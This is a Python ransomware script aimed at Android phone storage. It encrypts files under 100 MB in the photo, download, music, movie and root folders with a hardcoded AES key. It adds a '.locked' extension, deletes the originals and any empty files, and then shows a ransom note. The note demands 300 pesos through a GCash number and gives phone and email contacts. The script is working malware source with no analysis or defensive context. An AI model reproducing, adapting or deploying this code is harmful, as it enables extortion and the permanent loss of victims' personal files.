import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import binascii
import shutil
#KEY : "*************" (ask the creator of this tool)
aes_key_hex = "4f7c1d2e3a8b9c0d5e6f7a8b9c0d1e2f"
aes_key = binascii.unhexlify(aes_key_hex)  # Convert the hex key to bytes

# Function to encrypt a file
def encrypt_file(file_path, aes_key, encrypted_extension):
    try:
        # Check if the file size is empty
        if os.path.getsize(file_path) == 0:
            # Delete the file
            os.remove(file_path)

        # Check if the file size is less than 100Mb before encrypting
        elif os.path.getsize(file_path) < 100000000:
            # Prevent the file from re-encryption
            if file_path.endswith(encrypted_extension):
                return

            encrypted_file_path = file_path + encrypted_extension
            iv = get_random_bytes(16)
            cipher = AES.new(aes_key, AES.MODE_CFB, iv)

            with open(file_path, 'rb') as file:
                file_data = file.read()

            encrypted_data = cipher.encrypt(file_data)

            with open(encrypted_file_path, 'wb') as file:
                file.write(iv + encrypted_data)

            # Delete the file
            os.remove(file_path)

    except Exception as e:
        pass

# Function to decrypt a file
def decrypt_file(file_path, aes_key, encrypted_extension):
    try:
        # Check if the file has the expected encrypted extension before decrypting
        if not file_path.endswith(encrypted_extension):
            return

        with open(file_path, 'rb') as file:
            file_data = file.read()

        iv = file_data[:16]
        ciphertext = file_data[16:]
        cipher = AES.new(aes_key, AES.MODE_CFB, iv)
        decrypted_data = cipher.decrypt(ciphertext)
        decrypted_file_path = file_path[:-len(encrypted_extension)]

        with open(decrypted_file_path, 'wb') as file:
            file.write(decrypted_data)

        # Delete the file
        os.remove(file_path)

    except Exception as e:
        pass

# Function to process all files in a directory
def process_directory(directory_path, aes_key, encrypted_extension, status):
    for root, _, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if status == "e":
                encrypt_file(file_path, aes_key, encrypted_extension)
            elif status == "d":
                decrypt_file(file_path, aes_key, encrypted_extension)

# Function to process all storage directories
def process_all_storage_and_sdcard(aes_key, encrypted_extension, status):
    storage_directories = ["/storage/emulated/0", "/storage/emulated/10"]  # Add more storage paths if needed

    for directory in storage_directories:
        # Check if "Download" folder exists
        if os.path.exists(os.path.join(directory, "Download")):
            # Process the "Download" folder
            process_directory(os.path.join(directory, "Download"), aes_key, encrypted_extension, status)

        # Check if "downloads" folder exists
        if os.path.exists(os.path.join(directory, "downloads")):
            # Process the "downloads" folder
            process_directory(os.path.join(directory, "downloads"), aes_key, encrypted_extension, status)

        # Check if "Pictures" folder exists
        if os.path.exists(os.path.join(directory, "Pictures")):
            # Process the "Pictures" folder
            process_directory(os.path.join(directory, "Pictures"), aes_key, encrypted_extension, status)

        # Check if "DCIM" folder exists
        if os.path.exists(os.path.join(directory, "DCIM")):
            # Process the "DCIM" folder
            process_directory(os.path.join(directory, "DCIM"), aes_key, encrypted_extension, status)

        # Check if "Music" folder exists
        if os.path.exists(os.path.join(directory, "Music")):
            # Process the "Music" folder
            process_directory(os.path.join(directory, "Music"), aes_key, encrypted_extension, status)

        # Check if "Movies" folder exists
        if os.path.exists(os.path.join(directory, "Movies")):
            # Process the "Movies" folder
            process_directory(os.path.join(directory, "Movies"), aes_key, encrypted_extension, status)

        # Check if "Fonts" folder exists
        if os.path.exists(os.path.join(directory, "Fonts")):
            # Process the "Fonts" folder
            process_directory(os.path.join(directory, "Fonts"), aes_key, encrypted_extension, status)

        # Check if the root directory folder exists
        if os.path.exists(directory):
            # Process the entire storage
            process_directory(directory, aes_key, encrypted_extension, status)


if __name__ == "__main__":
    encrypted_extension = ".locked"  # Change this if you want a different extension
    status = "e"  # encrypt

    # Directly encrypt files
    process_all_storage_and_sdcard(aes_key, encrypted_extension, status)

    # Inform user about the encryption
    os.system("clear")
    message = f"""
                      \033[91m.-""-.\033[0m
                     \033[91m/ .--. \\\033[0m
                    \033[91m/ /   \\\ \\\033[0m
                    \033[91m| |    | |\033[0m
                    \033[91m| |.-""-.| \033[0m
                   \033[91m///`.::::.`\\\033[0m
                  \033[91m||| ::/  \\:: ;\033[0m
                  \033[91m||; ::\\__/:: ;\033[0m
                   \033[91m\\\\\\ '::::' /\033[0m
                    \033[91m`=':-..-'`\033[0m
      \033[91mERROR\033[0m: YOUR FILES HAS BEEN \033[91mENCRYPTED\033[0m!


Your personal documents, photos, and other files on this device are encrypted using AES-128 algorithm.
The original files have been completely deleted and will only be recovered by following the steps described below.

1. To obtain the key which will decrypt files,you need to pay 300 pesos from this gcash wallet address:
    >> \033[93m 09284962794 \033[0m <<

2. After the payment is completed, contact us to \033[96m 09451562126 or ubuntujaypxel@gmail.com \033[0m and send us the Transaction ID or your payment screenshot, and we will give you the key.


\033[91m[!]\033[0m Do not rename or modify encrypted files.
\033[91m[!]\033[0m Do not shutdown or restart your device or close this app as you will never recover your files back.
\033[91m[!]\033[0m Do not enter any key, we are not responsible for your own actions.
    """

    print(message)
    # No need for user input of key since it's hardcoded in the script
    aes_key_hex = input("KEY: ")  # Ask the user for the key
    aes_key = binascii.unhexlify(aes_key_hex)  # Decrypt the key from hexadecimal
    status = "d"  # decrypt
    os.system("clear")
    print("\033[91mIF THE KEY INPUT IS WRONG, YOUR FILES WILL BE CORRUPTED AS WE'RE ALREADY DECRYPTING YOUR FILES!\033[0m")
    process_all_storage_and_sdcard(aes_key, encrypted_extension, status)
